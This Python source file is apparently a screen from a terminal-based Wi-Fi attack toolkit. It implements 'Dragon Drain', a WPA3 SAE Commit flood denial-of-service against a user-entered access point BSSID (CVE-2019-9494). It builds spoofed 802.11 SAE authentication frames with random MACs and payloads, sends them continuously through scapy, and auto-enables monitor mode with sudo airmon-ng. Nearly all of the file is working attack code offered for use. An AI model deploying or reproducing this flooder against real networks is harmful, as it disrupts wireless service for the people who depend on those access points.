"""Dragon Drain — WPA3 SAE Commit flood DoS (CVE-2019-9494).

Sends spoofed SAE Authentication Commit frames to overwhelm the target AP's
elliptic-curve computation.  Runs entirely on the uConsole (scapy), does NOT
use the ESP32 serial link.
"""

import os
import re
import struct
import threading
import time

import urwid

from ...app_state import AppState
from ...loot_manager import LootManager
from ..widgets.log_viewer import LogViewer
from ..widgets.confirm_dialog import ConfirmDialog
from ..widgets.text_input_dialog import TextInputDialog

# SAE constants
_SAE_GROUP_ID = struct.pack("<H", 19)  # NIST P-256
_SCALAR_LEN = 32
_ELEMENT_LEN = 64  # x + y (32 each)


class DragonDrainScreen(urwid.WidgetWrap):
    """Sub-screen for WPA3 SAE Commit flood.

    Keys:
      [s] Start attack (asks for BSSID + monitor interface)
      [x] Stop attack
    """

    def __init__(self, state: AppState, app,
                 loot: LootManager | None = None) -> None:
        self.state = state
        self._app = app
        self._loot = loot

        self._running = False
        self._thread: threading.Thread | None = None
        self._target_bssid = ""
        self._iface = ""

        self._log = LogViewer(max_lines=200)
        self._status = urwid.Text(("dim", "  [s]Start  [esc]Back"))
        self._info = urwid.Text(("warning", "  Dragon Drain — idle"))

        self._idle_view = urwid.ListBox(urwid.SimpleFocusListWalker([
            urwid.Text(("default",
                        "  WPA3 SAE Commit Flood (CVE-2019-9494)\n\n"
                        "  Sends spoofed SAE Authentication frames to\n"
                        "  overwhelm the target AP's ECC computation.\n\n"
                        "  Requirements:\n"
                        "  - External WiFi adapter (e.g. Alfa)\n"
                        "  - Monitor mode (auto-enabled)\n\n"
                        "  Press [s] to start")),
        ]))
        self._body = urwid.WidgetPlaceholder(self._idle_view)

        pile = urwid.Pile([
            ("pack", self._info),
            ("pack", urwid.Divider("─")),
            self._body,
            ("pack", urwid.Divider("─")),
            ("pack", self._status),
        ])
        super().__init__(pile)

    # ------------------------------------------------------------------
    # refresh (called every second by attacks screen)
    # ------------------------------------------------------------------

    def refresh(self) -> None:
        if self.state.dragon_drain_running:
            frames = self.state.dragon_drain_frames
            self._info.set_text(
                ("attack_active",
                 f"  Dragon Drain RUNNING | {self._target_bssid} | "
                 f"Frames: {frames}")
            )
            self._status.set_text(("dim", "  [x]Stop"))
        else:
            self._info.set_text(("warning", "  Dragon Drain — idle"))
            self._status.set_text(("dim", "  [s]Start  [esc]Back"))

    # ------------------------------------------------------------------
    # Monitor interface detection
    # ------------------------------------------------------------------

    @staticmethod
    def _detect_monitor_ifaces() -> list[str]:
        """Return list of wireless interfaces in monitor mode."""
        ifaces: list[str] = []
        try:
            import subprocess
            result = subprocess.run(
                ["iw", "dev"], capture_output=True, text=True, timeout=5
            )
            current_iface = ""
            for line in result.stdout.splitlines():
                m = re.match(r"\s+Interface\s+(\S+)", line)
                if m:
                    current_iface = m.group(1)
                if "type monitor" in line and current_iface:
                    ifaces.append(current_iface)
                    current_iface = ""
        except Exception:
            pass
        return ifaces

    # ------------------------------------------------------------------
    # SAE Commit frame generation
    # ------------------------------------------------------------------

    @staticmethod
    def _random_mac() -> str:
        """Generate a random locally-administered unicast MAC."""
        octets = list(os.urandom(6))
        octets[0] = (octets[0] | 0x02) & 0xFE  # locally administered, unicast
        return ":".join(f"{b:02x}" for b in octets)

    @staticmethod
    def _generate_sae_commit() -> bytes:
        """Build 98-byte SAE Commit payload (group_id + scalar + element)."""
        scalar = os.urandom(_SCALAR_LEN)
        element = os.urandom(_ELEMENT_LEN)
        return _SAE_GROUP_ID + scalar + element

    # ------------------------------------------------------------------
    # Attack thread
    # ------------------------------------------------------------------

    def _flood_thread(self, bssid: str, iface: str) -> None:
        """Main flood loop — runs in background thread."""
        try:
            from scapy.all import RadioTap, Dot11, Dot11Auth, Raw, sendp
        except ImportError:
            self._log.append("ERROR: scapy not installed (pip install scapy)", "error")
            self.state.dragon_drain_running = False
            return

        self._log.append(f">>> Flooding {bssid} via {iface}...", "attack_active")
        count = 0
        last_log = 0.0

        while self._running:
            try:
                src_mac = self._random_mac()
                payload = self._generate_sae_commit()

                frame = (
                    RadioTap()
                    / Dot11(
                        type=0,       # Management
                        subtype=11,   # Authentication
                        addr1=bssid,  # Destination (AP)
                        addr2=src_mac,  # Source (spoofed)
                        addr3=bssid,  # BSSID
                    )
                    / Dot11Auth(
                        algo=3,       # SAE
                        seqnum=1,     # Commit
                        status=0,     # Success
                    )
                    / Raw(load=payload)
                )
                sendp(frame, iface=iface, verbose=0, count=1)
                count += 1
                self.state.dragon_drain_frames = count

                # Log progress every 2 seconds
                now = time.time()
                if now - last_log >= 2.0:
                    rate = count / max(now - self._start_time, 0.1)
                    self._log.append(
                        f"  Sent {count} frames ({rate:.1f}/s)", "dim"
                    )
                    last_log = now

                time.sleep(0.0625)  # ~16 frames/sec

            except OSError as e:
                self._log.append(f"  Send error: {e}", "error")
                time.sleep(1.0)
            except Exception as e:
                self._log.append(f"  Error: {e}", "error")
                self._running = False
                break

        self.state.dragon_drain_running = False
        self._log.append(f">>> Stopped. Total frames: {count}", "warning")

    # ------------------------------------------------------------------
    # Start / stop
    # ------------------------------------------------------------------

    def _start(self) -> None:
        if self.state.dragon_drain_running:
            return

        # Step 0: check for monitor mode interface first
        ifaces = self._detect_monitor_ifaces()
        if not ifaces:
            self._wait_for_monitor()
            return
        # Monitor found — proceed to BSSID input
        self._ask_bssid()

    @staticmethod
    def _detect_managed_ifaces() -> list[tuple[str, str]]:
        """Return list of (iface_name, driver) in managed mode."""
        try:
            from ...serial_manager import list_wifi_interfaces
            return [(name, drv) for name, mode, drv, chip
                    in list_wifi_interfaces() if mode != "monitor"]
        except Exception:
            return []

    def _wait_for_monitor(self) -> None:
        """Check for managed WiFi adapters and offer to enable monitor mode."""
        managed = self._detect_managed_ifaces()
        if managed:
            # Offer to auto-enable monitor mode
            self._offer_airmon(managed)
        else:
            # No WiFi at all — show waiting dialog
            self._wait_for_adapter()

    def _offer_airmon(self, managed: list[tuple[str, str]]) -> None:
        """Ask user which adapter to put into monitor mode."""
        from ..widgets.confirm_dialog import ConfirmDialog

        if len(managed) == 1:
            iface, driver = managed[0]
            label = f"{iface} ({driver})" if driver else iface

            def on_confirm(yes: bool) -> None:
                self._app.dismiss_overlay()
                if yes:
                    self._run_airmon(iface)
                # else: user cancelled

            dialog = ConfirmDialog(
                f"Enable monitor mode on {label}?\n\n"
                f"Will run: sudo airmon-ng start {iface}",
                on_confirm,
            )
            self._app.show_overlay(dialog, 52, 9)
        else:
            # Multiple managed interfaces — let user pick
            from ..widgets.file_picker import FilePicker
            labels = []
            for iface, driver in managed:
                label = f"{iface} ({driver})" if driver else iface
                labels.append(label)

            def on_pick(idx, name):
                self._app.dismiss_overlay()
                if idx < 0:
                    return
                self._run_airmon(managed[idx][0])

            picker = FilePicker(labels, on_pick,
                                title="Select adapter for monitor mode:")
            self._app.show_overlay(picker, 52, min(len(labels) + 6, 12))

    def _run_airmon(self, iface: str) -> None:
        """Run airmon-ng start <iface> in background, then proceed."""
        import subprocess

        self._log.append(f">>> Running: sudo airmon-ng start {iface}", "warning")
        self._body.original_widget = self._log

        def do_airmon():
            try:
                result = subprocess.run(
                    ["sudo", "airmon-ng", "start", iface],
                    capture_output=True, text=True, timeout=15,
                )
                if result.returncode == 0:
                    self._log.append(
                        f"  Monitor mode enabled on {iface}", "success"
                    )
                    # Small delay for interface to come up
                    time.sleep(1)
                    # Check what monitor interface was created
                    mon_ifaces = self._detect_monitor_ifaces()
                    if mon_ifaces:
                        self._log.append(
                            f"  Monitor interface: {mon_ifaces[0]}", "success"
                        )
                        self._ask_bssid()
                    else:
                        self._log.append(
                            "  Warning: no monitor interface found after airmon-ng",
                            "error",
                        )
                        self._wait_for_adapter()
                else:
                    self._log.append(
                        f"  airmon-ng failed: {result.stderr.strip()}", "error"
                    )
                    self._wait_for_adapter()
            except FileNotFoundError:
                self._log.append(
                    "  airmon-ng not found — install aircrack-ng", "error"
                )
                self._wait_for_adapter()
            except Exception as e:
                self._log.append(f"  Error: {e}", "error")
                self._wait_for_adapter()

        threading.Thread(target=do_airmon, daemon=True).start()

    def _wait_for_adapter(self) -> None:
        """Poll for WiFi adapter — auto-enable monitor mode when found."""
        from ..widgets.info_dialog import InfoDialog

        self._monitor_check_alarm = None
        self._monitor_waiting = True

        def check_adapter(loop=None, _data=None):
            if not self._monitor_waiting:
                return
            # Check for monitor mode first
            mon = self._detect_monitor_ifaces()
            if mon:
                self._monitor_waiting = False
                self._app.dismiss_overlay()
                self._ask_bssid()
                return
            # Check for managed adapter → auto-enable monitor
            managed = self._detect_managed_ifaces()
            if managed:
                self._monitor_waiting = False
                self._app.dismiss_overlay()
                # Auto-pick first adapter and run airmon-ng
                iface, driver = managed[0]
                label = f"{iface} ({driver})" if driver else iface
                self._log.append(
                    f">>> WiFi adapter detected: {label}", "success"
                )
                self._run_airmon(iface)
                return
            # Re-check every 2 seconds
            if hasattr(self._app, '_loop') and self._app._loop:
                self._monitor_check_alarm = self._app._loop.set_alarm_in(
                    2, check_adapter
                )

        msg = (
            "No WiFi adapter detected.\n\n"
            "Plug in your WiFi adapter\n"
            "(e.g. Alfa RTL8812AU)\n\n"
            "Monitor mode will be enabled\n"
            "automatically.\n\n"
            "Waiting for adapter..."
        )

        def on_dismiss():
            self._monitor_waiting = False
            if self._monitor_check_alarm and hasattr(self._app, '_loop'):
                try:
                    self._app._loop.remove_alarm(self._monitor_check_alarm)
                except Exception:
                    pass
            self._app.dismiss_overlay()

        dialog = InfoDialog(msg, on_dismiss, title="Dragon Drain")
        self._app.show_overlay(dialog, 48, 14)

        # Start polling
        if hasattr(self._app, '_loop') and self._app._loop:
            self._monitor_check_alarm = self._app._loop.set_alarm_in(
                2, check_adapter
            )

    def _ask_bssid(self) -> None:
        """Ask for target BSSID."""
        def on_bssid(bssid: str) -> None:
            self._app.dismiss_overlay()
            bssid = bssid.strip().upper()
            if not re.match(r'^[0-9A-F]{2}(:[0-9A-F]{2}){5}$', bssid):
                self._status.set_text(
                    ("error", "  Invalid BSSID format (XX:XX:XX:XX:XX:XX)")
                )
                return
            self._target_bssid = bssid
            self._pick_interface()

        def on_cancel() -> None:
            self._app.dismiss_overlay()

        dialog = TextInputDialog(
            "Target AP BSSID (XX:XX:XX:XX:XX:XX):", on_bssid, on_cancel
        )
        self._app.show_overlay(dialog, 50, 7)

    def _pick_interface(self) -> None:
        """Detect monitor interfaces and start or show error."""
        ifaces = self._detect_monitor_ifaces()

        if not ifaces:
            self._wait_for_monitor()
            return

        if len(ifaces) == 1:
            self._iface = ifaces[0]
            self._confirm_start()
            return

        # Multiple interfaces — let user pick
        from ..widgets.file_picker import FilePicker

        def on_pick(idx, name):
            self._app.dismiss_overlay()
            if idx < 0:
                return
            self._iface = ifaces[idx]
            self._confirm_start()

        picker = FilePicker(ifaces, on_pick, title="Select monitor interface:")
        self._app.show_overlay(picker, 45, min(len(ifaces) + 6, 12))

    def _confirm_start(self) -> None:
        def on_confirm(yes: bool) -> None:
            self._app.dismiss_overlay()
            if not yes:
                return
            self._do_start()

        dialog = ConfirmDialog(
            f"Start Dragon Drain?\n"
            f"Target: {self._target_bssid}\n"
            f"Interface: {self._iface}",
            on_confirm,
        )
        self._app.show_overlay(dialog, 50, 9)

    def _do_start(self) -> None:
        self._running = True
        self.state.dragon_drain_running = True
        self.state.dragon_drain_frames = 0
        self._start_time = time.time()
        self._log.clear()
        self._body.original_widget = self._log
        self._log.append(
            f">>> Dragon Drain: {self._target_bssid} via {self._iface}",
            "attack_active",
        )
        if self._loot:
            self._loot.log_attack_event(
                f"STARTED: Dragon Drain ({self._target_bssid} via {self._iface})"
            )
        self._thread = threading.Thread(
            target=self._flood_thread,
            args=(self._target_bssid, self._iface),
            daemon=True,
        )
        self._thread.start()

    def _stop(self) -> None:
        if not self._running:
            return
        self._running = False
        if self._thread:
            self._thread.join(timeout=3)
            self._thread = None
        self.state.dragon_drain_running = False
        self._log.append(">>> Dragon Drain stopped", "warning")
        if self._loot:
            self._loot.log_attack_event(
                f"STOPPED: Dragon Drain (frames: {self.state.dragon_drain_frames})"
            )

    # ------------------------------------------------------------------
    # Keypress
    # ------------------------------------------------------------------

    def keypress(self, size, key):
        if key == "s" and not self.state.dragon_drain_running:
            self._start()
            return None
        if key == "x":
            self._stop()
            return None
        return super().keypress(size, key)
